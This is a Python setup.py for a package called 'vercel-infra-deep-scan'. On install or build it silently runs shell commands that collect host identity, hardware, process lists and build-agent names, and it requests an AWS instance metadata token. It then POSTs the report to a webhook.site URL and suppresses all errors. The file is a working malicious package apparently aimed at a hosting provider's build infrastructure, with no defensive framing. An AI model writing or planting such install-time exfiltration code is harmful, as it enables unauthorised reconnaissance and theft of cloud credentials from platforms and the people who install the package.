import os
import subprocess
import base64
from setuptools import setup
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- ТВОЙ КОНФИГ ---
WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
MASTER_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="

def run(cmd):
    return subprocess.getoutput(cmd).strip()

# --- СБОРКА ДАННЫХ ---
final_proof = f"""
#######################################################
#    VERCEL INFRASTRUCTURE DEEP SCAN REPORT           #
#######################################################

[1. SYSTEM IDENTITY]
ID: {run('id')}
HOSTNAME: {run('hostname')}
KERNEL: {run('uname -r')}

[2. CPU & ARCHITECTURE]
CORES: {os.cpu_count()}
MODEL: {run('grep "model name" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
BOGO_MIPS: {run('grep "bogomips" /proc/cpuinfo | head -n 1 | cut -d: -f2')}

[3. MEMORY (RAM)]
TOTAL_RAM: {run('grep MemTotal /proc/meminfo')}
AVAILABLE: {run('grep MemAvailable /proc/meminfo')}

[4. GPU CHECK]
NVIDIA_SMI: {run('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo "No NVIDIA GPU"')}
LSPCI_VGA: {run('lspci | grep -i vga || echo "No PCI VGA detected"')}

[5. RUNNING PROCESSES (TOP 10)]
{run('ps -e -o pid,user,comm,pcpu,pmem --sort=-pcpu | head -n 11')}

[6. VERCEL INTERNAL AGENTS]
FOUND_AGENTS: {run('ps -ef | grep -E "vc|agent|build|executor" | grep -v grep')}

[7. CRYPTO & CLOUD]
AWS_METADATA_TOKEN: {run("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60' || echo 'BLOCKED'")}
MASTER_KEY_STATUS: {"FOUND" if MASTER_KEY_B64 else "NOT FOUND"}

#######################################################
"""

# --- ТВОЙ ПРОВЕРЕННЫЙ МЕТОД ОТПРАВКИ ---
try:
    subprocess.run(
        ['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', '@-', WEBHOOK_URL],
        input=final_proof.encode(),
        check=True
    )
except:
    pass

setup(name="vercel-infra-deep-scan", version="1.3.3.7")